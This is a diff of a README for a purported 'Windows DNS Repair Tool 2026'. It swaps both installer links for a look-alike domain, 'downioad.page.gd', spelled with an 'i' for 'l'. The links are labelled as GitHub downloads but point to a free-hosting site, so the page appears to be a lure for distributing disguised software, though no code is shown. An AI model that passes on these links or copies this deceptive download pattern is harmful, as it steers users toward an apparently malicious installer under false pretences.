@@ -2,7 +2,7 @@
 
 Windows DNS Repair Tool 2026 is a dedicated software application for Windows 10 and 11 users who face DNS (Domain Name System) problems. This tool automates the process of diagnosing and fixing common DNS errors, such as "DNS server not responding" or inability to resolve website addresses. By resetting network configurations and clearing cache, it aims to restore internet connectivity swiftly. Developed by the Xiaomi LLM Core Team, this utility emphasizes ease of use and reliability.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Overview
 
@@ -73,6 +73,6 @@ If the tool does not resolve your DNS issues, consider these additional steps:
 
 To get the latest version of the Windows DNS Repair Tool 2026, please visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: 2026*
